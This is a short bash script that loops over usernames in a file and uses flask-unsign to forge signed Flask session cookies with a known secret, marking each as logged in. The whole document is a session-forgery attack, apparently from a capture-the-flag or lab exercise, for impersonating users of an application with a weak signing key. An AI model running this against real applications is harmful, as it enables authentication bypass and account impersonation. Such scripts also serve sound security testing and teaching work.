#!/bin/bash
cat names.txt | while read line 
do

   flask-unsign --sign --cookie "{'logged_in': True, 'username': '$line'}" --secret 'secret123'
done
